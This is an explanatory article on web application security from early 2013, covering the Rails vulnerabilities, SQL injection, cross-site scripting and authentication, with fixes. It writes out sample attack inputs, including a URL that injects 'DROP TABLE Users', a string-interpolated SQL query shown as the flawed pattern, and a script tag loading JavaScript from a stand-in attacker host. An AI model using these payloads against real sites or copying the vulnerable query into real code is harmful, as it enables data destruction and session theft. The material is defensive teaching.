How much should you worry about Web security issues? And, what can you do
about them?
</p></div></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1c44580.0x1d3c3b0"></a></h2></div></div><p>
As I write these words in mid-February 2013, many Ruby on Rails developers
are worried. The framework that so many of us have used and enjoyed
for so many years, turned out to have some serious security flaws.
It's not just the sort of flaw that can allow someone to modify your Web
site either;these holes meant that a properly armed attacker could
execute arbitrary code on your server. And nowadays, &ldquo;properly
armed&rdquo;
is not a very high threshold because of such tools as Metasploit,
which make it laughably easy to launch an attack against an arbitrary
computer on the Internet.
</p><p>
Now, these events haven't shaken my faith in the overall security of
open-source software in general, or of Ruby on Rails in particular.
I've been quite impressed by the way in which the Rails core team members
have
reacted, making patches available and trying to find as many
unexploited vulnerabilities as possible, now that they've found that
Ruby's YAML parser can cause problems. But, I'm sure there are
plenty of businesses and individuals out there asking themselves
whether they've put their organization's servers in danger by using
open-source frameworks.
</p><p>
The answer is &ldquo;no&rdquo;, from everything I've seen through the years. True,
open-source software, by its very nature, is transparent, which means
vulnerabilities can be found and exploited more easily than in
some proprietary systems. At the same time, you have many more people
looking at the code and working to fix and improve it. Moreover,
anyone can join the team that's working to find and fix these security
problems. From what I can tell, many people who were spooked by recent
problems in Rails responded by actively looking for problems and by
trying to make it more secure.
</p><p>
So yes, it's scary to receive multiple messages from the Rails
security e-mail list, indicating (seemingly on a daily basis) that
there is another &ldquo;zero-day exploit&rdquo;, a flaw that can be used to break
into your system by the time you receive the warning message. But
these messages go out for all sorts of systems, not just those in the
open-source world. And if there is any lesson to be learned from
these warnings, it's that you need to subscribe to the security and/or
announcement lists for the frameworks and other important pieces of
software that you use.
</p><p>
Thus, I'm not worried about flaws in Rails or in other frameworks that
I use. The discussions on security have, however, reminded me that
the Internet is a scary and dangerous environment, with many users
willing and able to try to break into computers for fun or profit.
Protecting your Web application should be a priority in your
development work, such that you can ensure the safety of your
application, your data and your users' data.
</p><p>
In this article, I review a few of the basic principles of Web
application security, and what you can do to avoid risks or at least
reduce the risk that your software will suffer from problems. But as
security experts like to say, security is a process, not a one-time
fix, so you should expect to be checking, watching and
improving the security of your programs constantly, always assuming they'll be
attacked.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1c44580.0x1d3c7d0"></a>
SQL Injection</h2></div></div><p>
One of the oldest attacks against Web applications continues to cause
problems, despite the fact that effective solutions to this problem
have existed for more than 15 years.
</p><p>
The issue, illustrated brilliantly in <span   class="emphasis"><em>XKCD</em></span> comic #327, is that we
often pass input from users to an SQL query. For example, let's
assume that our Web application uses a database table named
&ldquo;users&rdquo;.
Let's further assume that a user can see his or her own information
via a URL that looks like this: http://example.com/users/215.
</p><p>
A nontechnical user might well ignore this URL. But many will look
at it and understand that the last part, the number 215, is being put
into a database query, something like:

<pre     class="programlisting">
SELECT * FROM Users WHERE id = 215;
</pre>
</p><p>
For now, let's ignore the issue of basic user security, in which
someone potentially can access another user's account simply
by changing the ID number. Instead, let's consider what happens if a
user enters the following URL:
http://example.com/users/215;DROP+TABLE+Users;.
</p><p>
If the application simply drops the last part of the URL into SQL, you
might end up with a database query that looks like this:

<pre     class="programlisting">
SELECT * FROM Users WHERE id = 215; DROP TABLE Users;
</pre>
</p><p>
Given that you can execute any number of queries within a single
session, and that each query ends with a semicolon, you can imagine
that this would be highly destructive. In many cases, of course, the
query quotes the parameter, as follows:

<pre     class="programlisting">
SELECT * FROM Users WHERE id = '215';
</pre>
</p><p>
In which case you would need to pass a malicious URL that looks like
this: http://example.com/users/215';DROP+TABLE+Users;.
</p><p>
Now, although such &ldquo;SQL injection&rdquo; attacks are easy to understand,
they're also easy to prevent&mdash;and yet, they continue to be
widespread. That's because many Web developers assume their
users will be decent and reasonable people, and that it's just easier
to grab information from the user and interpolate it into the SQL
string:


<pre     class="programlisting">
query = "SELECT * FROM Users WHERE id = #{params[:user_id]}";
</pre>
</p><p>
Of course, all it takes is one malicious user to guess that this is
how you have constructed your query, and your site goes down. (You
are backing things up regularly, right?) And an attacker can do much
more than just delete tables. It's possible, using SQL injection, to
update user permissions, view information belonging to other users or
remove conditions from a long and complex query.
</p><p>
The solution to this problem is simple. Nearly every language,
library and framework with which I'm familiar has a provision for
&ldquo;escaping&rdquo; user parameters. That is, instead of directly
interpolating the user's parameter into the SQL query, you pass it
through a separate function that automatically removes, or escapes,
any sensitive information. For example, in Rails, you can say:

<pre     class="programlisting">
User.where(["id = ?", params[:user_id]])
</pre>
</p><p>
Notice that you aren't putting <tt  >params[:user_id]</tt> directly inside the
string, but that you're rather putting a question mark there, and that
you're letting ActiveRecord perform the binding. If you were to put a
semicolon, quotation mark or other dangerous character within
<tt  >params[:user_id]</tt>, it wouldn't make a difference, because the
parameter-binding system would neutralize that threat.
</p><p>
The bottom line with SQL injection attacks is that they're largely
preventable, assuming you use the tools that come with your
favorite language and framework. I've personally used such tools with
Perl, Python, PHP and Java.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1c44580.0x1d3d118"></a>
Cross-Site Scripting (XSS)</h2></div></div><p>
SQL injection is aimed at the server and the database (and
application) running on it. By contrast, XSS is an attack aimed at
the other users of the site. Like SQL injection, XSS has existed for
quite some time and is relatively easy to remove in many frameworks.
Unlike SQL injection, however, XSS serves as the basis for many more
sophisticated attacks, allowing malicious users to take over users'
sessions and potentially execute commands on their behalf.
</p><p>
The idea is this: let's say that your site asks people to register
with not only an e-mail address and password, but also their real
name. That real name is displayed each time a user posts to a forum
on your site.
</p><p>
What happens if someone, instead of entering just their name, enters the
following:

<pre     class="programlisting">

Reuven Lerner&lt;script&gt;alert("Hello!");&lt;/script&gt;

</pre>
</p><p>
The server, not being very smart about what it takes in, saves this
entire piece of text as the user's name. When the user posts to a
forum, everything continues to work correctly. But when someone on
the site loads the latest list of forum postings, not only will the
malicious user's name be displayed, but an annoying alert box will
show up in the browser.
</p><p>
But hey, you can do even better than that. Maybe, instead of executing
code directly from within a &lt;script&gt; tag, you can use the tag to load
JavaScript from a remote server. For example, what if the nasty user
registers with the following name:


<pre     class="programlisting">

Reuven Lerner&lt;script src="http://evil-people.com/gotcha.js"&gt;&lt;/script&gt;

</pre>
</p><p>
Now whatever gotcha.js contains will be downloaded and executed by
each user on the site. If you're still thinking that this only
extends to modifying the user's page, manipulating the DOM or popping
alert dialog boxes onto the screen, you haven't yet considered
all of the ramifications. Consider that the evil JavaScript code is
now executing with the same permissions, cookies and session as the
legitimate user. Indeed, there's no way for the server to tell the
difference between a legitimate user's code and the evil JavaScript,
because they are all on the same page, executing within the same
context.
</p><p>
Once this script has been loaded onto the page, the game is largely
up. The key thing is to ensure that such scripts never
are inserted dynamically onto the page.
</p><p>
A simple solution to this problem is to escape all user content. That
is, if a user submits this:

<pre     class="programlisting">

&lt;script&gt;alert();&lt;/script&gt;;

</pre>
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1c44580.0x1d3d640"></a></h2></div></div><p>
you can turn that into:

<pre     class="programlisting">

&amp;lt;script&amp;gt;alert();&amp;lt;/script&amp;gt;;

</pre>
</p><p>
When this is displayed in the user's browser, it'll look like what was
submitted, but the tags no longer will be seen as tags&mdash;rather,
they'll be seen as literal &lt; and &gt; characters, without the ability to
execute anything. As of about 2&ndash;3 years ago, Rails escapes all HTML
by default. If you want to allow dynamically generated content to put
HTML tags on the screen, you must use the &ldquo;raw&rdquo; method on the text
string.
</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x1c44580.0x1d3d850"></a>
Authentication and Authorization</h2></div></div><p>
A third type of attack involves breaking through the login system,
such that a user can pretend to be another user on the system. The
easiest way for this to happen is by guessing passwords.
If your Web application allows users to choose weak passwords, and
also allows users to try to log in as many times as they like, the
result might well be a user whose account is compromised. If this is
a regular user without any privileges, that'll just be bad for
the specific user. But, if the account belongs to an administrative
user, the consequences could be dire and potentially even involve
legal liability.
</p><p>
Authentication is the term used to describe the users' need to
identify themselves to the computer system. Typically, this involves
a user name-password combination, although all sorts of
authentication systems exist, ranging from one-time hardware keys
to biometric scanners. Authorization, by contrast, refers to
checking whether a user, once authenticated, is allowed to perform
certain actions.
</p><p>
Here's some simple advice for rolling your own authentication system:
don't. Excellent authentication systems exist, some of
which come built-in with Web application frameworks and others of
which are third-party add-ons. Consider the skill level, motivation
and time that attackers have, and you'll probably realize you're
unlikely to come up with an authentication system that is truly robust
and secure. Even tried-and-true authentication systems, written by
experts and deployed on thousands of servers, have been found to have
security holes.
</p><p>
An extension of this argument is to outsource authentication entirely,
using Facebook, LinkedIn or GitHub (among others) to authenticate
your users. This is becoming an increasingly popular option for
many Web applications, relieving them of much of the responsibility for
authentication. However, this does raise the question of whether you
really want to depend on a third-party, commercial company
whose interests are almost certainly not the same as yours, for your
authentication needs. Then again, users are more likely than not to
trust a login system from Facebook than your own home-grown system.

Conclusion</h2></div></div><p>
Security, as I wrote above, and as many people have said through the
years, is a process, not a one-time solution. Being aware of
potential security problems and taking them into account when
developing your system takes time, but is an essential part of the
well-being of your Web application. The three items I've
outlined here&mdash;SQL injection, cross-site scripting and
authentication&mdash;are three of the most popular ways that people
attack Web applications. But there are many more, so trying to keep
up with these problems, and incorporating them into your regular
reading list, is an investment that surely will pay off.

Resources</b></p><p>
There are many different sources, in print and on-line, about Web
security. One of the best and authoritative sources is OWASP, the
Open Web Application Security Project (<a href="http://owasp.org" target="_self">owasp.org</a>), whose Web
site has a huge number of articles, tutorials and suggestions that
all Web developers should read. You might want to look at its &ldquo;Top
Ten Project&rdquo;, which introduces and describes the ten most problematic
Web security issues you should consider and try to prevent.
</p><p>
An excellent introduction to XSS attacks was written more than a
decade ago by Paul Lee, but it's still relevant. You can read it at
IBM's site:
<a href="http://www.ibm.com/developerworks/tivoli/library/s-csscript" target="_self">www.ibm.com/developerworks/tivoli/library/s-csscript</a>.
</p><p>
The recent outbreak of security problems in the Ruby and Rails worlds
have led to a flurry of activity, as well as descriptions of what went
wrong. Patrick McKenzie has written a particularly thorough blog post
on the subject at <a href="http://www.kalzumeus.com/2013/01/31/what-the-rails-security-issue-means-for-your-startup" target="_self">www.kalzumeus.com/2013/01/31/what-the-rails-security-issue-means-for-your-startup</a>, and he described these problems in an interview on the Ruby Rogues
podcast on February 20, 2013. You can listen to that at
<a href="http://rubyrogues.com/093-rr-security-exploits-with-patrick-mckenzie" target="_self">rubyrogues.com/093-rr-security-exploits-with-patrick-mckenzie</a>.
</p><p>
In his interview with the Rogues, Patrick mentioned a tool with which
I wasn't previously familiar, called Brakeman, which reviews your
Rails application for potential security problems. It's super easy to
use: just <tt  >gem install brakeman</tt>, and then run the brakeman program
from within your Rails application. You'll get a beautifully
formatted HTML page listing the problems and potential problems that
it was able to find in your application.
</p><p>
Patrick and others also recommend a good book, <span   class="emphasis"><em>The Tangled
Web</em></span>, by
Michal Zalewski, published by No Starch Press in 2012. If you're
interested in Web security, you should read this book. It's sure
to open your eyes to the world of &ldquo;bad guys&rdquo; on the Internet, and what
you can do to avoid problems with them.
